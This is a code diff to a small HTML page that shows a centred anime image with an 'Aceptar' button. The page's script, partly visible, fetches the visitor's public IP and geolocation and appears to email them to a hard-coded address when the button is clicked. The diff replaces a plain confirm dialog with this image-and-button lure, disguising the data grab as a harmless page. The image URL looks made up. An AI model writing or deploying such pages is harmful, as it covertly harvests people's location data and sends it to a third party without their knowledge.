@@ -9,10 +9,45 @@
             margin: 0;
             padding: 0;
             background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            text-align: center;
+        }
+        img {
+            max-width: 500px;
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+        .button-container {
+            margin-top: 20px;
+        }
+        button {
+            padding: 12px 30px;
+            font-size: 16px;
+            background-color: #333;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #555;
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <img src="https://i.pinimg.com/originals/7d/8a/8c/7d8a8c9c5e5f5c5b5a5d5c5b5a5d5c5b.jpg" alt="Ulquiorra Cifer">
+        <div class="button-container">
+            <button onclick="aceptar()">Aceptar</button>
+        </div>
+    </div>
 
     <script>
         const CORREO_DESTINO = 'fernandorokefort@gmail.com';
@@ -28,7 +63,7 @@
                 obtenerUbicacion(ipPublica);
             })
             .catch(error => {
-                mostrarDialogo();
+                console.log('Error obteniendo IP');
             });
         
         // Obtener ubicación
@@ -39,19 +74,14 @@
                     if (data.status === 'success') {
                         ubicacion = data;
                     }
-                    mostrarDialogo();
                 })
                 .catch(error => {
-                    mostrarDialogo();
+                    console.log('Error obteniendo ubicación');
                 });
         }
         
-        function mostrarDialogo() {
-            const resultado = confirm('¿Aceptar?');
-            
-            if (resultado) {
-                enviarCorreo();
-            }
+        function aceptar() {
+            enviarCorreo();
         }
         
         function enviarCorreo() {
